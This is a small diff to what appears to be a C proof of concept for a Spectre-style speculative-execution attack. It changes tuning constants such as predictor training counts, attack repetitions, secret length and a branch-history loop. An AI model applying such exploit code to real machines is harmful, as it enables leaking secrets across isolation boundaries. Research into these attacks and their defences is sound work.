@@ -3,10 +3,10 @@
 #include "encoding.h"
 #include "cache.h"
 
-#define TRAIN_TIMES 10 // assumption is that you have a 2 bit counter in the predictor
+#define TRAIN_TIMES 6 // assumption is that you have a 2 bit counter in the predictor
 #define ROUNDS 1 // run the train + attack sequence X amount of times (for redundancy)
-#define ATTACK_SAME_ROUNDS 30 // amount of times to attack the same index
-#define SECRET_SZ 27
+#define ATTACK_SAME_ROUNDS 20 // amount of times to attack the same index
+#define SECRET_SZ 26
 #define CACHE_HIT_THRESHOLD 50
 
 uint64_t array1_sz = 16;
@@ -106,7 +106,7 @@ int main(void){
                 passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select TRAIN_IDX or attackIdx 
 
                 // set of constant takens to make the BHR be in a all taken state
-                for(uint64_t k = 0; k < 50; ++k){
+                for(uint64_t k = 0; k < 30; ++k){
                     asm("");
                 }
 
